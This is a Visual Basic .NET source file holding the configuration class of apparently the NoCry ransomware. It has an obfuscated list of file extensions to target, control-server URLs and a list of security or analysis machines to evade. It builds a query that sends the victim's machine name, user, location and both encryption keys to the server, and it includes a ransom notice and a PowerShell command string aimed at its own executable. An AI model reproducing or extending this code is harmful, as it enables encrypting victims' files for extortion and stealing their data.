Imports System.IO
Imports System.Text
Imports System.Security.Cryptography

Public Class clsS

#If DEBUG Then
    Public Shared sExtensionFilter() As String = {".nocry"}
#Else

    Public Shared sExtensionFilter() As String = {Obf("xn4bLnipRwphWIw/jsjQ6w=="), Obf("xn4bLnipRwrdyJNi7GnVuA=="), Obf("Q2XWyYu95XbyLhFVJfqbKg=="), _
                                                  Obf("+BsBKH7P3hFow/zSsphPrg=="), Obf("8o4n4J2YKFYjxWnoXsuhoQ=="), Obf("EwzqJN/T9TCD5NVsUchu+Q=="), _
                                                  Obf("rDeosqjljlwuGkgyGIOZ0g=="), Obf("BMYfDfK8iknE7YcF86m+Sg=="), Obf("BMYfDfK8ikmdbKyi8GK+3w=="), _
                                                  Obf("l7JctDgALrFndZvLg56Wog=="), Obf("BnR3RjEOArpDgadLe38PvA=="), Obf("0hizl5GRWv1kcPa6BmPaNw=="), _
                                                  Obf("kVLx+cnxmXZ4XKQBlRrH/g=="), Obf("HdswwDNWkvHzsBiE1b3i6A=="), Obf("UBIoXSuls/SEqSDPG+9xkw=="), _
                                                  Obf("7GGt+pgsxdd/70YzgijR2g=="), Obf("03PVNuKldpmOG2bFya6dXw=="), Obf("nlQrX826arHX1NratTyEag=="), _
                                                  Obf("tU0EwZpY1fyDeViyhSnh4Q=="), Obf("w7V3AtNHRv+2I2cwEVyTSQ=="), Obf("EPJphhGcdOr5MpfV+JegGA=="), _
                                                  Obf("sD7mbEzAWGG2TwSRaE6Svg=="), Obf("X6QK+SjeznMYLv9h7mde/Q=="), Obf("sD7mbEzAWGGTcmApiNt0TQ=="), _
                                                  Obf("CjvfNpMwAaeEZcwqt0zC9A=="), Obf("wJep8kPMaVSu39pLkK1w1w=="), Obf("A9/RJkElu1ZBD8JgfZndRg=="), _
                                                  Obf("DjVvhtW81dQ0KKwBlKlmjQ=="), Obf("2A2OXvc0ANbzWZu1IQumBA=="), Obf("jW/qx9ta09ItPDFLC+Ypqg=="), _
                                                  Obf("5TTI/OhBaIU4CvpVh2s7+w=="), Obf("J+ZN2NsJJbi2IG1BUJOsrA=="), Obf("Zkw7AQGOLRKOBxTMJ6utgA=="), _
                                                  Obf("+0b1QR/+lbL95koswEF40g=="), Obf("Fho8QvCTWhylKT6LbHJgZw=="), Obf("r8/L5KHM2GwJgKrm1kPF6g=="), _
                                                  Obf("zfIAUZD7l0BuVKiPHjNTUw=="), Obf("sD7mbEzAWGHOmQJMfwWArQ==")}
#End If

    Public Shared oMutex As Threading.Mutex

    Public Shared sUrl As String() = {Obf("CO0IMt0ENFkuhvRhdFtt8KmIHvOfrXX/cDxr9HMX5ej6ivqHXUTrL0zahqkann7obx7J/ySeTgVQhn8RdgIPz7JMKo9Sgc0ccn8XrrLXTHo="), _
                                      Obf("CO0IMt0ENFkuhvRhdFtt8KmIHvOfrXX/cDxr9HMX5ej6ivqHXUTrL0zahqkann7obx7J/ySeTgVQhn8RdgIPz7JMKo9Sgc0ccn8XrrLXTHo=")}

    Public Shared sSecurityMachines As String() = {Obf("c3UhFfm7Pv6rvljeAZAQ6ckSNjTliGFIWeZlQDN5c54="), Obf("yCIFa5VaOIX6FIbk2uiuOKofgjxgEOvofhvkaPj2P6s="), Obf("YFAreOfK9rA2ej0iQ/B/Bhiym2cX9K/1r/5vgLGPnQw="), Obf("/Ff22+NhM2vs1Ma0frYVSDoRVE3H3MLcpKievvbCoFQ="), Obf("3OjawcIHY9DUTJc41chMGK/jmI93JQ4nGLghBakArC4="), _
                                                   Obf("ijzLTfpZ5BTTW/PaDxmIlUJ0fREOQxzxZxX0lLoHZQg="), Obf("Xh0LgG/gPpLCac3JVGAzQg=="), Obf("GZy8kB32EpT13yGAg6c4UoTZz4nj2liC"), Obf("KRWOgDXwMr9v4+fN24+6KC7kK/lxrsEBCSNt7tGSmNo="), _
                                                   Obf("lhKHMNMFERex0loZDyys1dHr8neSPvtWCBMNRvFpKIo="), Obf("jEOdvqgBQUQdP7+2XBbkCQ=="), Obf("TorMqr6QA3JvqNjV5T9HBw=="), _
                                                   Obf("3OjawcIHY9DR35wwivUwGB/ZtshMZ9xlTxYyBafp2Xw="), Obf("QeKf45fieHabLzvfkX3cUaVQ0ALKj+3kldORA6AJS5U="), Obf("KT+S/DYWSl6CVYcTGdwFkBK5OLYFPenJ"), Obf("D5rzQR61OeJRoLJJdO4YuA=="), Obf("/vk8yjVMG6h15SLXJshJcBd9tE8rYvkNr8qgXAqKf6g="), _
                                                   Obf("w+n1GK5lnfYyCvP02v3/cekPNftLVzeAVZUYKFq0mpk="), Obf("w+n1GK5lnfYyCvP02v3/cXPJxSRQwHc9sb1C7RStfFE=")}


    Public Shared sExcludedFolders As String() = {Obf("Wtb1BahvJYNaKxXE0MzrOVyk84U82aGiA6esxY4Af8f4VEUzAku8yhPP/klh3e9/"), Obf("ZUjXQa27999VoNMF5K4KzqsCMSnQfHbn"), Obf("ZUjXQa27999qQjxiFCIoFyRMeWV52EsHH5YFV1EMLwY="), Obf("+fW52FcpoJjPkCjJHCN1Eg69ZhRYgSl4BRwR7fmw0MIFbG1IRdDyEiMqsCCcfFF6vjrh9locjHc="), _
                                                  Obf("yYcwth5GgjktexnqSPPwtg=="), Obf("hUkqB7X9ZeZI+xvGK6G4OA=="), Obf("RGrNNCLhApY="), Obf("8/5/s9Mf1j8="), Obf("fJ/2SM1hrsqgxg4kek1DLHHGgEiLMW7T"), Obf("Wtb1BahvJYNaKxXE0MzrOVyk84U82aGiA6esxY4Af8f4VEUzAku8yr6z9k2g3fmVe+qabU/QT5U="), _
                                                  Obf("7FhnXRDjnVe3AB134I2jaA=="), Obf("yL1N7IulLzRCowXEDl6Oft0N+zJROOi4"), Obf("26TNlXj/khMYOjXPXDG2hooqAP3C1v13"), Obf("yaNH6V3BQso6yvKhOK+zLQ==")}

    Public Shared sSharedName As String() = {Obf("tvMY7dKCFwLdjzZLNG/j3eIpUXkvfnqEt6gKAp3nQa0="), Obf("tvMY7dKCFwLdjzZLNG/j3cG0Idk7cgGYsWq7QgaXNWg="), Obf("tvMY7dKCFwLdjzZLNG/j3RPaKAfH7n/S17//ot5yHLM="), Obf("tvMY7dKCFwLdjzZLNG/j3QE3Z44LJcKZThw/IJt4Qxk="), _
                                             Obf("cQbYna5PkdVHZh8DdIGJQs2OokZxOgNGzK1z6lQYjhkS2IsxWSNznEbCgB79/T4HMh8cQZ4Jwlg=")}

    Public Shared sSharedExtension As String() = {Obf("EAH4a0dgDJrbXftdR4Gd3g=="), Obf("Deli8YgYWrRmWJXIH3V2Mw=="), Obf("PYawjhUO38pzX0R64I9FFQ==")}

    Public Shared sInfo As String = Path.Combine(GetSpecialFolder(Environment.SpecialFolder.LocalApplicationData), Obf("CMK3XLvkCKJm9vKGvGBhCEx1V3qV5Zq4"))

    Public Shared sChar As String = Obf("I6822F4hFijHrv5cBUxHbFMTWtQ9nVF+sXeBfCasWt1eF8IEAqyFEYqeGRXuULCjwKjh10/kcyMJ5bF9KxTCSVgMMEGpSDYNAJIXFYH9vdAKzNvc4Tr3UV2uqx+ggBKuyR4VqmRZIzPgBUEb300mYKVLD+p3atBXIyihbaHEiyxNmYX3CC3v/fQgAvq+3HIR")

    Public Shared hdd As String
    Public Shared sFormat As String = Obf("tjg1OGBrYD+cfSB6LS0saWuXgV2SaCIwtV74FDbT5s0/Sq6XpJmzZpWmz1/ksd0PoGF/Uu6GeV+nrVtIuRXotme59Y8mmji5")
    Public Shared sPrimaryKey As String = GetHwId()
    Public Shared sSecondaryKey As String = CreatePass(30)
    Public Shared bytPK As Byte() = clsCrypto.GetKey(sPrimaryKey, 31)
    Public Shared bytSK As Byte() = clsCrypto.GetKey(sSecondaryKey, 15)

    Public Shared sExe As String = Application.ExecutablePath.ToString
    Public Shared sMachineName As String = System.Environment.MachineName.ToString()
    Public Shared sUserName As String = Environment.UserName
    Public Shared sLocation As String = clsGeoIP.GetHostInfo(clsGeoIP.GetExternalIp).Country & "|" & clsGeoIP.GetHostInfo(clsGeoIP.GetExternalIp).IP
    Public Shared sQuery As String = "usuario=" & sMachineName & "|" & sUserName & "|" & hdd & "|" & sLocation & "|" &
                               DateTime.Now.ToString("dd/MM/yy") & "&llave1=" & sPrimaryKey & " " & "&llave2=" & sSecondaryKey & " "

    Public Shared fInfo As System.IO.FileInfo = My.Computer.FileSystem.GetFileInfo(sExe)

    Public Shared sFade As String = Obf("3OpwB94WmwtukPCZwTuZgsLA5IiroUET") & sExe & "';" & _
                "$ArraySize=" & fInfo.Length & Obf("8IGpASV0vyUh0H+I3pCm4bx0E92vAfZOBp72+4//VC/S2uaZgOZvKo7eloHL84d1J9tGPxdxYQyxOCj/oU2PGZPg7xJ5w66sJQ4AqSCnEThdh9bzYqBWIMThShY0tH98") & _
                Obf("r6k7fxzyXAbrs0ovy8raFDq5sl52JF4idQa1b0AZhjyqOi7L2T0XFVVYhLrDnacsEozPwim3SxeqWkL/jqZZYr+Hwy6uGfbi3p5XLkvxwWXm3hWGFbZVejeXC/xctqFOxGaARgl0WoNGxPlSFFrMd1ZB76gWjIx/i5gXSUyLsJgxPcgXxynuMMMGmDxmXkkPMH56fvr8M7ZVN4x/VQsQOaqkNSGb3v6MhVV3S5+Bd66hWv9utuEEzjNEAsGXIpL5oyHcuO0USN7WVaX6nfZnLBS8Bmbl5pjK") & _
                Obf("kP9mChmqZL1GubRQI4vefaVuIBQUNFGtcATy1r8zG+CObiLE7u6okQ==") & " '" & _
                Application.ExecutablePath & "' -force"

    Public Shared sNotice As String = Obf("oX2TupJZvXL83RBdBfD2FKRiwnr/yAj0dpC54ybmDuZ1dI+UzvmvcOwsXTFBcFbPZUEYNy8ffszM6s60j6OrD82wXYbr7TD3IqRX2o/OCdGBPzq6q84qV4Bp+We0P+sC9sMTv26Rg2iwZYWruKnxIm+hBqB5SvsanzSO2Cao3L74I/a3LPjTeqU5xsfkgEsnkIuSeCfZjf3USEJovjA2SG5l2FJBVhvcfwNpLy/Br4+FkWmG89RcyV5yLGMp9G9YTouEjrx8/JN/eDa4SbI0bka+CimMPtgwNhzTKU6SxOhYAMYQ7Qo9jtChd7nxm+He") & _
                Path.GetFileName(sInfo) & Obf("Ok196Urxe23C557eUArz5IwfhJfV/cubO+fXZ6Uv52dFiNCK7ir/5VtliTLOZGXiUPi2d05F4s7kdDzHgy6Jqk8039hNoeqXaqSqs1wI58gKbWoRBPwWWCLEEO8G+VEvA/CTr/yEYNBiRdOaME+ghD9egFO0YUUQ/LATdDjhnd9bWP781ADBFgjoRFi0bjZe8ae4kJnwDcpkeEDUcKOgJA==")


    Public Shared ms As MemoryStream
    Public Shared csCs As System.Security.Cryptography.CryptoStream
    Public Shared cspRijndael As New System.Security.Cryptography.RijndaelManaged

    Public Const FileNotFoundException As Integer = 53
    Public Const MAX_FILE_SIZE As Long = 52428800

End Class
